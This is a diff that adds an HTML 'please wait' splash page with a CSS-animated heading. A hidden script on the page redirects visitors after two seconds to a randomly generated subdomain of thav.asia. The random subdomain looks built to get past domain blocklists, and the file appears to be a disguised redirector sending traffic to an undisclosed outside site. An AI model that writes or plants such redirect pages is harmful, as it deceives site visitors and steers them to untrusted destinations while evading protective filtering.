@@ -1,0 +1,71 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>稍等片刻，精彩呈现</title>
+    <style>
+    *{
+      margin: 0;
+      padding: 0;
+    }
+    :root{
+      --ellipse: 6.25rem;
+    }
+    html,body{
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #222;
+    }
+    h1{
+      font-size: 4rem;
+      color: #333;
+      width: 37.5rem;
+      position: relative;
+    }
+    h1::after{
+      content:attr(data-text);
+      position: absolute;
+      top: 0;
+      left: 0;
+      color: transparent;
+      background-image: linear-gradient(to left,#1a2a6c,#b21f1f,#fdbb2d);
+      background-clip: text;
+      -webkit-background-clip: text;
+      clip-path: ellipse(var(--ellipse) var(--ellipse) at 0% 50%);
+      animation: move 5s infinite;
+    }
+    @keyframes move{
+      0%, 100%{
+        clip-path: ellipse(var(--ellipse) var(--ellipse) at 0% 50%);
+      }
+      50%{
+        clip-path: ellipse(var(--ellipse) var(--ellipse) at 100% 50%);
+      }
+    }
+    </style>
+</head>
+<body>
+    <h1 data-text="稍等片刻，精彩呈现">
+      稍等片刻，精彩呈现
+    </h1>
+    <script>
+        setTimeout(function() {
+            function randomPrefix(length) {
+                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
+            const prefix = randomPrefix(6); // 生成6位随机字符串
+            const randomDomain = prefix + ".thav.asia";
+
+            window.location.href = "https://" + randomDomain;
+        }, 2000);
+    </script>
+</body>
+</html>
